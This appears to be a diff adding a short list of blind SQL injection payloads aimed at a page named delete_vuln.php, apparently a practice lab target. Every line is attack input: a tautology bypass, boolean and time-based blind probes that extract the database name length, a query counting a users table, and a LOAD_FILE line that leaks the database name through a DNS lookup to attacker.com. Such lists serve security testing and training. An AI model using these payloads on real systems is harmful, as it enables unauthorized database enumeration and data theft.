@@ -1,0 +1,6 @@
+/blindsql/delete_vuln.php?id=4
+id=99' OR 1=1-- -
+id=99' AND 1=2-- -
+id=99' AND IF(LENGTH(DATABASE())=8,SLEEP(5),1)-- -
+id=99' AND (SELECT COUNT(*) FROM users)>2-- -
+id=99' AND LOAD_FILE(CONCAT('\\\\',(SELECT DATABASE()),'.attacker.com\\abc'))-- -
